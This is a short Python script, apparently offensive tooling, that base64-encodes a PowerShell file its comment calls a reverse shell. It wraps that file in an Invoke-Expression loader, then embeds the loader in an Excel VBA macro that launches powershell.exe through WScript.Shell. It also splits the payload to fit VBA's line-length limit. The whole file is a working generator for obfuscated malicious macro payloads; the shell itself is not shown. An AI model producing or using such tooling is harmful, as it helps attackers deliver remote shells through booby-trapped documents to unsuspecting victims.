import base64

# base64 encoded reverse shell
with open('./powershell.ps1', 'rb') as f:
    encoded_bytes = base64.b64encode(f.read())
    encoded_string = encoded_bytes.decode('utf-8')

with open("./powershell-enc.payload.ps1", 'w') as f:

    payloadPwsh = '''Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REPLACE_ME"))) '''
    payloadPwsh=payloadPwsh.replace("REPLACE_ME", encoded_string)

    f.write(payloadPwsh)

with open("./powershell-vba.payload.vba", 'w') as f:

    payloadVBA = '''
Sub test1()

    REPLACE_ME
    
    Set WshShell = CreateObject("WScript.Shell")
    Set WshShellExec = WshShell.Exec(strCommand)
    strOutput = WshShellExec.StdOut.ReadAll
    Msgbox strOutput

End Sub

'''


    # we must split the payload in half,  as vba in excel only accepts line lengths <= 1023
    payloadVBAPwshSplit = [
        payloadPwsh[0:len(payloadPwsh)//2],
        payloadPwsh[len(payloadPwsh)//2:]
        ]

    payloadVBA = payloadVBA.replace("REPLACE_ME", (
        'strCommand = "powershell.exe -Command ""\n'+
        'strCommand = strCommand & "'+payloadVBAPwshSplit[0]+'"\n'+
        'strCommand = strCommand & "'+payloadVBAPwshSplit[1]+'"\n'
        ))

    # if(len(payloadPwsh) >= (1023-len('strCommand = "powershell.exe -Command """""'))):
    #     raise Exception("Line too long ({})! Payload will not work!".format(len(payloadPwsh)))

    f.write(payloadVBA)